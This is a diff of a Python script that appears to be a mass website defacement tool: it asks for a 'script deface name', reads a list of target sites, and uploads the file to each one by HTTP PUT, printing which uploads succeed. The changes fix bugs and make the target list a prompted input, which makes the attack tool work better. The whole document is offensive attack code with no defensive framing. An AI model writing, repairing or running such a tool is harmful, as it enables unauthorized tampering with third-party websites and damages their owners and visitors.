@@ -40,28 +40,31 @@ def x(tetew):
     return str(ipt)
 
 
-def aox(script, target_file="/storage/emulated/0/NonTesting/liste.txt"):
+def aox(script, target_file):
     op = open(script, "r").read()
-    with open(target_file, "r") as target:
-        target = target.readlines()
-        s = requests.Session()
-        print("uploading file to %d website" % (len(target)))
-        for web in target:
-            try:
-                site = web.strip()
-                if site.startswith("http://") is False:
-                    site = "http://" + site
-                req = s.put(site + "" + script, data=op)
-                if req.status_code < 200 or req.status_code >= 250:
-                    print(m + "[" + b + " FAILED!" + m + " ] %s/%s" % (site, script))
-                else:
-                    print(m + "[" + h + " SUCCESS" + m + " ] %s/%s" % (site, script))
+    try:
+        with open(target_file, "r") as target:
+            target = target.readlines()
+            s = requests.Session()
+            print("uploading file to %d website" % (len(target)))
+            for web in target:
+                try:
+                    site = web.strip()
+                    if not site.startswith("http://"):
+                        site = "http://" + site
+                    req = s.put(site + "/" + script, data=op)
+                    if req.status_code < 200 or req.status_code >= 250:
+                        print(m + "[" + b + " FAILED!" + m + " ] %s/%s" % (site, script))
+                    else:
+                        print(m + "[" + h + " SUCCESS" + m + " ] %s/%s" % (site, script))
 
-            except requests.exceptions.RequestException:
-                continue
-            except KeyboardInterrupt:
-                print;
-                exit()
+                except requests.exceptions.RequestException:
+                    continue
+                except KeyboardInterrupt:
+                    print()
+                    exit()
+    except IOError:
+        print("Error: Could not open or read the file:", target_file)
 
 
 def main(__bn__):
@@ -70,15 +73,20 @@ def main(__bn__):
         try:
             a = x("Enter your script deface name: ")
             if not os.path.isfile(a):
-                print("file '%s' not found" % (a))
+                print("File '%s' not found" % (a))
                 continue
             else:
                 break
         except KeyboardInterrupt:
-            print;
+            print()
             exit()
 
-    aox(a)
+    target_file = x("Enter the target file name (e.g., liste.txt): ")
+    if not os.path.isfile(target_file):
+        print("File '%s' not found" % (target_file))
+        exit()
+
+    aox(a, target_file)
 
 
 if __name__ == "__main__":
